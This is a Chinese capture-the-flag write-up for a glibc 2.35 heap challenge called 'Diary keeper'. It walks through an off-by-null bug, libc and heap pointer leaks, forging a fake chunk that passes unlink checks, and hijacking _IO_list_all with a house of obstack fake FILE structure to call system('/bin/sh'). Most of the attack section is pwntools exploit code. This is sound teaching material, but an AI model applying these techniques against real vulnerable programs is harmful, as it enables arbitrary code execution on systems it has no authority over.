# Diary keeper

## 题目简述

题目是 glibc 2.35 环境下的菜单堆题，程序维护日记条目，每个条目包含 `date`、`weather`、`content` 等字段，并提供增删查功能。漏洞点是 off-by-null，可影响相邻 chunk size。程序的 `show` 功能会打印 `date` 和 `weather` 字段，因此可以分别泄露 libc 地址和堆地址。拿到两个基址后，不需要再用复杂堆风水去盲造 fake chunk，可以直接在可控堆块中伪造满足 unlink 检查的 chunk。

利用目标是通过 off-by-null 制造重叠/合并，最终劫持 `_IO_list_all`，布置 house of obstack 链调用 `system("/bin/sh")`。

## 解题过程

先分配若干大块和隔离块，释放后通过 `show` 读取残留指针。`date` 字段用于泄露 unsorted bin 中的 libc 指针，`weather` 字段用于泄露堆指针：

```python
show(0)
io.recvuntil(b"Date: ")
libc_base = u64(io.recv(7).ljust(8, b"\x00")) - 0xa + 0x80 - 0x21ac80

show(2)
io.recvuntil(b"Weather: ")
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0xb0a
```

有了 `heap_base` 后，在受控 chunk 中伪造 fake chunk。为了通过双向链表检查，`fd` 和 `bk` 都指向 fake chunk 自身：

```python
fake_size = 0x161
fake_presize = 0x160
fake_fd = heap_base + 0x1340
fake_bk = heap_base + 0x1340

payload1 = p64(0) + p64(fake_size) + p64(fake_fd) + p64(fake_bk)
payload2 = b"a" * 0x40 + p64(fake_presize)
```

随后通过 off-by-null 触发错误合并，构造堆重叠，再把 tcache/fastbin 方向调整到 `_IO_list_all`。glibc 2.35 下可以使用 house of obstack 伪造 `_IO_FILE` 相关结构：

```python
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
IO_list_all = libc_base + libc.symbols["_IO_list_all"]
io_list = (heap_base + 0x1440) >> 12 ^ IO_list_all
_IO_obstack_jumps = libc_base + 0x2173c0
```

最终伪造的结构把函数指针放到 `system`，参数位置放入 `/bin/sh`，并让 vtable 指向 `_IO_obstack_jumps + 0x20`：

```python
payload = flat(
    {
        0x18: 1,
        0x20: 0,
        0x28: 1,
        0x30: 0,
        0x38: p64(system),
        0x48: p64(bin_sh),
        0x50: 1,
        0xd8: p64(_IO_obstack_jumps + 0x20),
        0xe0: p64(heap_base + 0x720),
    },
    filler=b"\x00",
)
```

把该结构写入目标 chunk 后触发退出流程，glibc 遍历 `_IO_list_all` 时进入伪造链，最终执行 `system("/bin/sh")`。

## 方法总结

- 核心技巧：off-by-null 伪造 chunk 合并，利用已泄露的堆地址手动满足 unlink 检查，再走 house of obstack。
- 识别信号：glibc 2.35、可泄露 libc/heap、off-by-null 可控相邻 chunk 时，可以考虑直接构造 fake chunk 降低堆风水复杂度。
- 复用要点：伪造双向链表时先解决 `fd/bk` 自洽，再考虑 `_IO_list_all` 或其他全局结构劫持。
